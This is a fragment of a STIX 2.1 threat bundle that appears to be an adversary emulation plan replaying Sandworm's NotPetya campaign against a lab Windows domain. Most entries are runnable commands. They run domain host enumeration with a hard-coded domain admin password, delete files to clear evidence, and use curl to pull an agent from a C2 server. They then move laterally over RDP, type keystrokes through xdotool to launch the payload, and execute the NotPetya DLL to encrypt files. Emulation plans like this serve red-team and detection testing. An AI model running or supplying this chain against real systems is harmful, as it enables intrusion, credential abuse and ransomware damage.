            "spec_version": "2.1",
            "id": "relationship--cb7ec745-adf3-4066-b8b3-6d2f1626a109",
            "created": "2024-02-04T21:44:08.36477Z",
            "modified": "2024-02-04T21:44:08.36477Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--65639630-733c-4179-8543-2c64cb577ca0"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--6222bcab-b7ec-4523-a236-273d48270649",
            "created": "2024-02-04T21:44:08.367647Z",
            "modified": "2024-02-04T21:44:08.367647Z",
            "name": "Sandworm Remote System Discovery (dsquery)",
            "description": "Sandworm Enumerate all domain hosts via dsquery.exe in preparation for notpetya deployment.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1018",
                    "input_arguments": {
                        "dc.target.host": {
                            "default": "10.0.1.4",
                            "description": "The hostname or IPv4 address of the domain controller.",
                            "type": "string"
                        },
                        "domain.admin.name": {
                            "default": "patreides",
                            "description": "The name of the target domain admin account to use.",
                            "type": "string"
                        },
                        "domain.admin.password": {
                            "default": "ebqMB7DmM81QVUqpf7XI",
                            "description": "The password of the target domain admin account.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "dsquery.exe computer -s #{dc.target.host} -u #{domain.admin.name} -p #{domain.admin.password}\n"
                            }
                        }
                    },
                    "technique_name": "Remote System Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--40b20c69-0e8b-4664-8036-69f83b2c4a73",
            "created": "2024-02-04T21:44:08.368947Z",
            "modified": "2024-02-04T21:44:08.368947Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--6222bcab-b7ec-4523-a236-273d48270649",
            "target_ref": "domain-name--f25ba5a8-363a-5503-bd63-001ad9c8f9a6"
        },
        {
            "type": "domain-name",
            "spec_version": "2.1",
            "id": "domain-name--f25ba5a8-363a-5503-bd63-001ad9c8f9a6",
            "value": "patreides"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--96f7df7e-e86b-47b9-aa4d-4373103d5b8c",
            "created": "2024-02-04T21:44:08.37036Z",
            "modified": "2024-02-04T21:44:08.37036Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--6222bcab-b7ec-4523-a236-273d48270649",
            "target_ref": "user-account--039c2bf2-d3f3-431c-9740-2284ef34c16f"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--039c2bf2-d3f3-431c-9740-2284ef34c16f",
            "credential": "ebqMB7DmM81QVUqpf7XI"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--dde54f9c-0e61-4c3c-a163-60467d664156",
            "created": "2024-02-04T21:44:08.371421Z",
            "modified": "2024-02-04T21:44:08.371421Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--6222bcab-b7ec-4523-a236-273d48270649",
            "target_ref": "ipv4-addr--36fc78b8-53c4-5522-9444-f2339460a1f7"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--36fc78b8-53c4-5522-9444-f2339460a1f7",
            "value": "10.0.1.4"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--410bc361-e43f-4644-af74-36f6c2d9df85",
            "created": "2024-02-04T21:44:08.378998Z",
            "modified": "2024-02-04T21:44:08.378998Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--6222bcab-b7ec-4523-a236-273d48270649"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--d91962e6-cb75-4f29-b2ce-36db15415e40",
            "created": "2024-02-04T21:44:08.379357Z",
            "modified": "2024-02-04T21:44:08.379357Z",
            "name": "Sandworm Cleanup Artifacts",
            "description": "Sandworm Team has used backdoors that can delete files used in an attack from an infected system.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1070.004",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "del /Q C:\\Windows\\System32\\oradump.exe C:\\Windows\\System32\\mslog.exe C:\\Windows\\System32\\mslog.txt\n"
                            }
                        }
                    },
                    "technique_name": "Indicator Removal on Host: File Deletion"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--f36ffe65-2a15-4e13-abf1-aafe1b102408",
            "created": "2024-02-04T21:44:08.37959Z",
            "modified": "2024-02-04T21:44:08.37959Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--d91962e6-cb75-4f29-b2ce-36db15415e40"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--2093de68-db55-4c75-82d1-3abd5fc58028",
            "created": "2024-02-04T21:44:08.383204Z",
            "modified": "2024-02-04T21:44:08.383204Z",
            "name": "Terminate RDP Session to Second Target (Gammu)",
            "description": "End the RDP session to the second target.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection originates from the attacker's machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1021.001",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "proc": {
                                "command": "pkill xfreerdp\n"
                            }
                        }
                    },
                    "technique_name": "Remote Services: Remote Desktop Protocol"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--f9336489-8d4c-487d-b540-fa0eba6430cb",
            "created": "2024-02-04T21:44:08.383435Z",
            "modified": "2024-02-04T21:44:08.383435Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--2093de68-db55-4c75-82d1-3abd5fc58028"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--690e889f-5844-473e-98c5-c90c9f1772dc",
            "created": "2024-02-04T21:44:08.383643Z",
            "modified": "2024-02-04T21:44:08.383643Z",
            "name": "Prepare Tools for Ingress Tool Transfer (Arrakis)",
            "description": "",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1105",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "sh": {
                                "cleanup": "rm -rf sw_tools\n",
                                "command": "mkdir -p sw_tools;\nserver=\"#{server}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:windows\" -H \"server:$server\" -H \"group:arrakis\" $server/file/download > perfc.exe;\nchmod +x perfc.exe;\ncp SharpNP.dll ./sw_tools/;\nmv perfc.exe ./sw_tools/;\n",
                                "payloads": [
                                    "SharpNP.dll"
                                ]
                            }
                        }
                    },
                    "technique_name": "Ingress Tool Transfer"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--c3cf21c8-9ea6-4d83-ac63-754d7148cf56",
            "created": "2024-02-04T21:44:08.383833Z",
            "modified": "2024-02-04T21:44:08.383833Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--690e889f-5844-473e-98c5-c90c9f1772dc"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--2f107b88-065f-4d91-9d46-212212b235d5",
            "created": "2024-02-04T21:44:08.384034Z",
            "modified": "2024-02-04T21:44:08.384034Z",
            "name": "Lateral Movement Via RDP (Arrakis)",
            "description": "This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection must originate from the attacker's machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1021.001",
                    "input_arguments": {
                        "dc.target.host": {
                            "default": "10.0.1.4",
                            "description": "The hostname or IPv4 address of the domain controller for lateral movement.",
                            "type": "string"
                        },
                        "domain.admin.name": {
                            "default": "patreides",
                            "description": "The name of the domain admin account for lateral movement to the domain controller.",
                            "type": "string"
                        },
                        "domain.admin.password": {
                            "default": "ebqMB7DmM81QVUqpf7XI",
                            "description": "The password of the domain admin account for lateral movement to the domain controller.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "proc": {
                                "command": "exec-background xfreerdp +clipboard /u:WORKGROUP\\\\#{domain.admin.name} /p:\"#{domain.admin.password}\" /v:#{dc.target.host} /drive:X,./sw_tools /cert-ignore\n"
                            }
                        }
                    },
                    "technique_name": "Remote Services: Remote Desktop Protocol"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--ab0e030f-1760-4c25-a168-01ff4218e926",
            "created": "2024-02-04T21:44:08.385215Z",
            "modified": "2024-02-04T21:44:08.385215Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--2f107b88-065f-4d91-9d46-212212b235d5",
            "target_ref": "ipv4-addr--36fc78b8-53c4-5522-9444-f2339460a1f7"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--36fc78b8-53c4-5522-9444-f2339460a1f7",
            "value": "10.0.1.4"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--8a7c4208-3c59-4b79-a3b0-b2b5589cd59b",
            "created": "2024-02-04T21:44:08.386216Z",
            "modified": "2024-02-04T21:44:08.386216Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--2f107b88-065f-4d91-9d46-212212b235d5",
            "target_ref": "domain-name--f25ba5a8-363a-5503-bd63-001ad9c8f9a6"
        },
        {
            "type": "domain-name",
            "spec_version": "2.1",
            "id": "domain-name--f25ba5a8-363a-5503-bd63-001ad9c8f9a6",
            "value": "patreides"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--17086830-4ef7-4a2b-b6a9-6b4877e572f9",
            "created": "2024-02-04T21:44:08.387705Z",
            "modified": "2024-02-04T21:44:08.387705Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--2f107b88-065f-4d91-9d46-212212b235d5",
            "target_ref": "user-account--a83485bb-42f4-4020-bd7f-bdd609570b6d"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--a83485bb-42f4-4020-bd7f-bdd609570b6d",
            "credential": "ebqMB7DmM81QVUqpf7XI"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--3c63abe3-7acb-47cf-bc33-9fe14980bd8e",
            "created": "2024-02-04T21:44:08.387939Z",
            "modified": "2024-02-04T21:44:08.387939Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--2f107b88-065f-4d91-9d46-212212b235d5"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--58cf78ef-e777-4de8-aeaa-8cc8349be6f7",
            "created": "2024-02-04T21:44:08.388147Z",
            "modified": "2024-02-04T21:44:08.388147Z",
            "name": "Download and Execute Agent for Lateral Movement (Arrakis)",
            "description": "Downloads a new agent executable and executes it on the domain controller over RDP.\nThis ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),\nsince the RDP connection will be from the attacker's machine.\nRequires xdotool to be installed on the running machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1105",
                    "input_arguments": {
                        "dc.target.host": {
                            "default": "10.0.1.4",
                            "description": "The hostname or IPv4 address of the domain controller for lateral movement.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "sleep 30;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:#{dc.target.host}\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool windowactivate --sync \"$rdp_window\" key Super_L;\nsleep 5; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"powershell.exe\";\nsleep 5; xdotool windowactivate --sync \"$rdp_window\" key --clearmodifiers --delay 200 Control_L+Shift_L+Return;\nsleep 10; xdotool windowactivate --sync \"$rdp_window\" key Left;\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 15; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 'copy \\\\TSCLIENT\\X\\perfc.exe .\\perfc.exe';\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 '.\\perfc.exe';\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 30;\n",
                                "timeout": 180
                            }
                        }
                    },
                    "technique_name": "Ingress Tool Transfer"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--ff2a034a-d8b6-443e-9459-c6095a7d979a",
            "created": "2024-02-04T21:44:08.390824Z",
            "modified": "2024-02-04T21:44:08.390824Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--58cf78ef-e777-4de8-aeaa-8cc8349be6f7",
            "target_ref": "ipv4-addr--36fc78b8-53c4-5522-9444-f2339460a1f7"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--36fc78b8-53c4-5522-9444-f2339460a1f7",
            "value": "10.0.1.4"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--8e6c4e57-7389-495b-97d6-ce791d82af52",
            "created": "2024-02-04T21:44:08.39106Z",
            "modified": "2024-02-04T21:44:08.39106Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--58cf78ef-e777-4de8-aeaa-8cc8349be6f7"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--ba30987a-efc8-46a6-b0ec-94f4cc53dbff",
            "created": "2024-02-04T21:44:08.391368Z",
            "modified": "2024-02-04T21:44:08.391368Z",
            "name": "Sandworm Download NotPetya",
            "description": "Sandworm downloads NotPetya (perfc.dat) using powershell.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1105",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "psh": {
                                "cleanup": "if (Test-Path \"C:\\Windows\\perfc.dat\") { rm C:\\Windows\\perfc.dat };\n",
                                "command": "copy \\\\TSCLIENT\\X\\SharpNP.dll C:\\Windows\\perfc.dat;\ndir C:\\Windows\\perfc.dat;\n"
                            }
                        }
                    },
                    "technique_name": "Ingress Tool Transfer"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--ee13309f-cee3-4542-bd1a-3a7a96775d0a",
            "created": "2024-02-04T21:44:08.391575Z",
            "modified": "2024-02-04T21:44:08.391575Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--ba30987a-efc8-46a6-b0ec-94f4cc53dbff"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--9a39f75e-215d-4ef5-b505-ce81be74d58f",
            "created": "2024-02-04T21:44:08.391775Z",
            "modified": "2024-02-04T21:44:08.391775Z",
            "name": "Sandworm Executes NotPetya (perfc.dat)",
            "description": "Sandworm executes NotPetya (perfc.dat). NotPetya creates a scheduled task called \"Restart\" that reboots the\nworkstation and is executed at the end of the program.\nNotPetya encrypts files under C:\\Users (recursive) via AES-128.\nNotPetya drops a ransom note in C:\\README.txt.\nNotPetya copies and executes itself on other hosts.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1486",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "psh": {
                                "cleanup": "if (Test-Path \"C:\\README.txt\") { rm C:\\README.txt };\nschtasks /delete /tn Restart /F;\n",
                                "timeout": 300,
                                "command": "rundll32.exe C:\\Windows\\perfc.dat,\"#1\"\n"
                            }
                        }
                    },
                    "technique_name": "Data Encrypted for Impact"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--b3b476c0-c126-4ea4-99ac-1910ed8ef597",
            "created": "2024-02-04T21:44:08.392087Z",
            "modified": "2024-02-04T21:44:08.392087Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--9a39f75e-215d-4ef5-b505-ce81be74d58f"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--a86485c0-772d-4159-aa6f-5c2a9bb13ac8",
            "created": "2024-02-04T21:44:08.392317Z",
            "modified": "2024-02-04T21:44:08.392317Z",
            "name": "Terminate RDP Session to Domain Controller (Arrakis)",
            "description": "End the RDP session to the domain controller.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection originates from the attacker's machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1021.001",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "proc": {
                                "command": "pkill xfreerdp\n"
                            }
                        }
                    },
                    "technique_name": "Remote Services: Remote Desktop Protocol"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--36e6d54b-dec2-4883-b3d7-a940e733a8eb",
            "created": "2024-02-04T21:44:08.392504Z",
            "modified": "2024-02-04T21:44:08.392504Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--a86485c0-772d-4159-aa6f-5c2a9bb13ac8"
        }
    ]
}
